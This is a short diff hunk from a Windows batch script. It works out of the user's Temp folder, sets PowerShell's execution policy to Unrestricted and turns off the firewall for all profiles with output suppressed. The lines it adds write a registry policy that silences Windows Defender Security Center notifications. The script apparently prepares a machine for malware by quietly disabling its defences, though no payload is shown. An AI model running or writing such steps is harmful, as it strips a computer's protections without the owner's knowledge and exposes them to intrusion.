@@ -10,6 +10,9 @@ cd /d "C:\Users\%username%\AppData\Local\Temp"
 
 powershell -command "Set-ExecutionPolicy Unrestricted -Force"
 
+:: disable windows security notifications
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f
+
 :: disable firewall
 netsh advfirewall set allprofiles state off >nul 2>&1
 
